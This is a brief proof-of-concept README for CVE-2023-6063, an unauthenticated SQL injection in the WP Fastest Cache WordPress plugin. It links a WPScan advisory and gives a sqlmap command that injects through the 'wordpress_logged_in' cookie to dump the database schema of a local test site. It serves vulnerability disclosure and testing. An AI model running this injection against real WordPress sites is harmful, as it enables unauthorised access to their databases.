# CVE-2023-6063 PoC

## Reference

- [Unauthenticated SQL Injection Vulnerability Addressed in WP Fastest Cache 1.2.2 | WPScan](https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/)

## Plugin setting

Enable "WP Fastest Cache".

![Image 1](/image_1.png)

## PoC

The "wordpress_logged_in" cookie parameter is vulnerable.

```
$ python sqlmap.py --dbms=mysql -u "http://127.0.0.1/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 --schema
```

![Image 2](/image_2.png)
